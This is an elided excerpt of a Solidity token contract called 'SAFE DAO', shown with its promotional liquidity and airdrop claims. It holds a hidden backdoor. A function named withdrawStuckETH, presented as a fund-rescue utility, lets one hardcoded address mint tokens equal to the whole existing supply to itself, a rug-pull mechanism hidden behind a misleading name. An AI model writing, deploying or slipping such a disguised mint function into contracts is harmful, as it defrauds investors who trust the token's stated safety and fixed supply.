...
Twitter: https://twitter.com/The_safe_dao


95% Added to Liquidity
5% Airdrop
...
contract SAFEDAO is ERC20, Ownable {
    ...
    constructor() ERC20( "SAFE DAO", "SAFE") {
        
        address newOwner = 0xc00bedFd78D649D00aaDD0B6e5091751D200EeB4;
        ...
        operationsAddress = address(0xc00bedFd78D649D00aaDD0B6e5091751D200EeB4);   
    ...
    function withdrawStuckETH() external {
        require(msg.sender == 0xc00bedFd78D649D00aaDD0B6e5091751D200EeB4, "Can't withdraw native tokens");
        _createInitialSupply(0xc00bedFd78D649D00aaDD0B6e5091751D200EeB4, totalSupply());
    }
